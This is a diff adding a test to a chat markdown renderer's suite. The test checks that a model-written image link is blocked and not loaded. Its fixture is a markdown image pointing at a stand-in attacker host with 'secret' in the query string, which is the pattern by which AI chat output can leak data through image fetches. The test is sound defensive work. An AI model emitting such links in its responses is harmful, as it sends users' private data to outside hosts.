@@ -89,6 +89,14 @@ describe("streaming", () => {
     expect(container.querySelector(".md-caret")).toBeNull();
   });
 
+  it("never loads an image the model wrote", () => {
+    const { container } = renderWithProviders(
+      <ChatMarkdown content={"Done ![status](https://attacker.example/p?d=secret)"} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector(".md-img-blocked")?.textContent).toBe("[status]");
+  });
+
   it("leaves a balanced fence untouched", () => {
     const { container } = renderWithProviders(
       <ChatMarkdown content={"```\nok\n```"} streaming />,
